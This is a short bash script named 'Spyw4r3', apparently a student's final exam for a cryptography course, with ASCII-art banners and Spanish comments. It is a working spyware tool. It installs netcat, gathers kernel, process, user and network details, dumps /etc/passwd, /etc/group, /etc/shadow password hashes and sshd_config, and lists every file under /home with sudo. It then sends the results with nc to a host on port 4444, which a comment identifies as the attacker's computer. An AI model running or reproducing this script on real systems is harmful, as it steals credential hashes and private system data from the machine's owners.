
#!/bin/bash

#Examen final cripto
#Spyw4r3

banner_spyw4r3(){
    clear
    echo -e "\033[32m" 

    cat << "EOF"
    ⠀⢠⡿⠿⠿⠿⢿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⡿⠿⠿⠿⠿⣦⠀
    ⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⡿⠆⠀⠀⠀⠀⠰⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣀⣤⡤⠄⢤⣀⡈⢿⡄⠀⠀⠀⠀⢠⡟⢁⣠⡤⠠⠤⢤⣀⠀⠀⠀⠀
    ⠐⢄⣀⣼⢿⣾⣿⣿⣿⣷⣿⣆⠁⡆⠀⠀⢰⠈⢸⣿⣾⣿⣿⣿⣷⡮⣧⣀⡠⠀
    ⠰⠛⠉⠙⠛⠶⠶⠏⠷⠛⠋⠁⢠⡇⠀⠀⢸⡄⠈⠛⠛⠿⠹⠿⠶⠚⠋⠉⠛⠆
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡇⠀⠀⢸⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢻⠇⠀⠀⠘⡟⠳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠰⣄⡀⠀⠀⣀⣠⡤⠞⠠⠁⠀⢸⠀⠀⠀⠀⡇⠀⠘⠄⠳⢤⣀⣀⠀⠀⣀⣠⠀
    ⠀⢻⣏⢻⣯⡉⠀⠀⠀⠀⠀⠒⢎⣓⠶⠶⣞⡱⠒⠀⠀⠀⠀⠀⢉⣽⡟⣹⡟⠀
    ⠀⠀⢻⣆⠹⣿⣆⣀⣀⣀⣀⣴⣿⣿⠟⠻⣿⣿⣦⣀⣀⣀⣀⣰⣿⠟⣰⡟⠀⠀
    ⠀⠀⠀⠻⣧⡘⠻⠿⠿⠿⠿⣿⣿⣃⣀⣀⣙⣿⣿⠿⠿⠿⠿⠟⢃⣴⠟⠀⠀⠀
    ⠀⠀⠀⠀⠙⣮⠐⠤⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠤⠊⡵⠋⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠈⠳⡀⠀⠀⠀⠀⠀⠲⣶⣶⠖⠀⠀⠀⠀⠀⢀⠜⠁⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    █▀ █▀█ █▄█ █░█░█ █░█ █▀█ ▀▀█
    ▄█ █▀▀ ░█░ ▀▄▀▄▀ ▀▀█ █▀▄ ▄██
EOF



    echo -e "\033[0m" 
}

#Fucnion que nos ayuda a recopilar la informacion mas importante del sistema
informacion_sistema(){
    echo "*** Kernel y Arquitectura ***"
    uname -a

    echo "=== Sistema Operativo y Version ==="
    cat /etc/os-release

    echo "*** Procesos Activos ***"
    ps aux

    echo "=== Usuarios y Grupos ==="
    echo "Usuarios:"
    cat /etc/passwd
    echo "Grupos:"
    cat /etc/group

    echo "*** Hash de Contrasenas salteadas ***"
    cat /etc/shadow 2>/dev/null

    echo "=== Archivos en el directorio HOME del usuario ==="
    sudo find /home/ -type f -exec ls -lh {} + 2>/dev/null


    echo "*** Conexiones de Red ***"
    ss -tunlp

    echo "=== Interfaces de Red ==="
    ifconfig || ip addr

    echo "*** Archivos de Configuracion Importantes ***"
    cat /etc/hosts
    cat /etc/ssh/sshd_config 2>/dev/null 
}

#Funcion para exfiltrar los datos obtenidos a la computadora del atacante usando netcat
exfiltrate_d4ta(){
    echo -e "\033[31m"	
    echo "Enviando datos..."
    cat << "EOF"
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠉⠀⠀⠀⠱⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⣑⠡⡀⡀⠀⢀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣄⠈⣌⠪⡄⢰⢡⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣾⣀⠈⢂⠃⡈⠘⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣿⣷⣄⠤⢢⠁⡠⠂⠢⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠏⣸⡿⠟⣾⠓⠉⡖⠀⠀⠈⢂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⡏⢸⠟⠀⣾⠀⠈⢡⡠⠂⠀⠈
⠱⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⡀⡇⢈⠐⠠⡟⠀⠀⢞⡿⢅⠄⢀
⠀⠹⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠜⠊⢛⡃⠘⠀⠀⡇⠀⡈⠶⠄⠒⠂⡔
⠀⠀⠘⣿⣿⣿⣷⣄⣀⠀⠤⡠⡤⠒⠫⠱⠀⣼⠧⠀⠀⠀⢁⠠⢱⠤⠒⠒⣠⠇
⠀⠀⠀⠘⢿⣿⣿⣿⣾⡷⡋⣞⠔⡣⠎⠙⠂⠘⠒⠲⡖⡒⠒⡶⢙⠀⠈⠉⣸⠀
⠀⠀⠀⠀⠀⠉⠻⣿⣿⡿⣿⣿⣯⠪⡖⠤⠤⠔⣀⣤⡃⠀⠀⡁⠀⣀⠄⠊⡜⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡌⠙⢿⣾⡫⠅⠂⠉⠀⠀⠁⠪⢁⠈⠉⠀⠀⣸⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠉⠀⠀
EOF

    sleep 3
    ip="192.168.100.16"  
    port=4444           
    nc $ip $port < resultados.txt || echo "Error al enviar datos"
}

#Funcion que instala las dependencias necesarias y la herramienta netcat
install_t00ls(){
    echo "Instalando dependencias necesarias..."
    apt update && apt install netcat-traditional -y 
}

main(){
    banner_spyw4r3
    sleep 3
    install_t00ls
    informacion_sistema > resultados.txt
    exfiltrate_d4ta
}

main
